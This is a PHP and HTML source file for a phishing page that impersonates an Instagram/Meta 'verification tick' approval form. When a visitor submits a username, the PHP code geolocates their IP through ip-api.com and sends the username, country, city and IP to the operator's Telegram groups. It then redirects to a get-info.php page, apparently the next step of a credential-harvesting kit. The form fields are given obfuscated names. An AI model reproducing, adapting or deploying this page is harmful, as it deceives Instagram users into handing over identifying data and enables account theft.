<?php 
error_reporting(0);
  include "config.php";
  if ($_POST) {
    $username = $_POST["zwous"];
    $ip = ($_SERVER["REMOTE_ADDR"] != "::1" ? $_SERVER["REMOTE_ADDR"] : "");
	  
    $konum = file_get_contents("http://ip-api.com/json/".$ip);
    $cek = json_decode($konum, true);
    $ulke = $cek["country"];
    $sehir = $cek["city"];
    

    date_default_timezone_set('Europe/Istanbul');
    $cur_time = date("d-m-Y H:i:s");

    $admin_message = "nick : ".$username;
    $admin_message .= "\nulke : ".$ulke;
    $admin_message .= "\nsehir : ".$sehir;
    $admin_message .= "\nip : ".$cek["query"];

    $user_message  = "nick : ".$username;

    TelegramSendMessage($bot_admin, [
      "chat_id" => $group_admin,
      "text" => $admin_message,
    ]);

    TelegramSendMessage($bot_kullanici, [
      "chat_id" => $group_kullanici,
      "text" => $user_message,
    ]);
    
    header("Location: get-info.php?nick=" . $_POST['zwous']);
  }  
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>Blue | Application Meta</title>
  <meta name="description" content="" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="stylesheet" href="./assets/style.css">
  <link rel="shortcut icon" href="./assets/img/head.ico" type="image/x-icon">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" />
  <style>
    .red {
      color: red;
      display: none;
    }
  </style>
</head>

<body>
  <?php 
error_reporting(0);
    include "header.php";
  ?>
  <div class="lsf_o">
    <div class="card">

      <form autocomplete="off" method="post" id="asdDasas"enctype="multipart/form-data">
        <center>
          <img src="./assets/img/meta.png" width="300">
          <h1 style="font-family:sans-serif; font-weight:400;  color:#3d3d3d; font-size:20px;">
            Approval | Tick Form

          </h1>
          <br><br>
          <h5 style="font-family:sans-serif; color:#999; width: 80%;">
            Type Your Username, Click the "Continue" button
          </h5>

          <input type="text" class="fdasf_o" id="fdasf_o" name="zwous" placeholder="User Name"><br>
          <span class="red" id="fdasf_o_validation">Username is required</span><br>
          <button type="submit" id="bvsf_asd" class="bvsf_asd">
            <span>Continue
            </span>
          </button><br>
          <img src="./assets/img/meta.gif" width="300px">
        </center>

      </form>
    </div>

  </div>


  <script>
    addEventListener("load", () => {
      const input = document.querySelector('#fdasf_o');
      const span = document.querySelector('#fdasf_o_validation');
      const form = document.querySelector("#asdDasas");

      form.addEventListener("submit", (e) => {
        if (input.value.trim() == "") {
          e.preventDefault();
          span.style.display = "block";
        } else {
          span.style.display = "none";
        }
      });
    });
  </script>

  <div class="footer">
    <p>© 2022 Instagram from Meta</p>
  </div>
</body>

</html>